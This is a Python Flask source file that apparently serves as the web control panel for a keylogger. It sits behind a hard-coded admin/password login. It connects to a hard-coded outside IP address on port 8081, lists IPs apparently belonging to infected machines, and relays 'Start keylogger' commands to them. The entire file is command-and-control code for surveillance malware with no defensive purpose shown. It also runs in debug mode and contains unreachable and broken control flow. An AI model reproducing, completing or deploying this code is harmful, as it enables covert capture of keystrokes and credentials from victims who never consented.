#!/usr/bin/env python

from flask import Flask
from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
import os
import socket
import json 
import sys

app = Flask(__name__)
 
@app.route('/')
def home():
    if not session.get('logged_in'):
        return render_template('login.html')
        return redirect(url_for('login'))
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/login', methods=['POST'])
def login():
    if request.form['password'] == 'password' and request.form['username'] == 'admin':
        session['logged_in'] = True
        return redirect(url_for('main_activity'))
    else:
        return render_template('login.html')

@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("167.99.194.11",8081))
    while True:
        data_b = sock.recv(4096)
        data = data_b.decode('utf-8')
        ip_list = data.split(':')
        print('Connected', file=sys.stdout)
        if request.method == 'POST':
            print(request.form.get('keyloginfo'), file=sys.stdout)
            if request.form['submit'] == 'Start keylogger':
                print('hello', file=sys.stdout)
                req = request.form.get('keyloginfo')
                print(req, file=sys.stdout)
                sock.send(req.encode('utf-8'))
            return render_template('main_activity.html', data = ip_list)
        #TODO Change to error page        
        if request.method == 'GET':
            return render_template('main_activity.html', data = ip_list)

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.run()
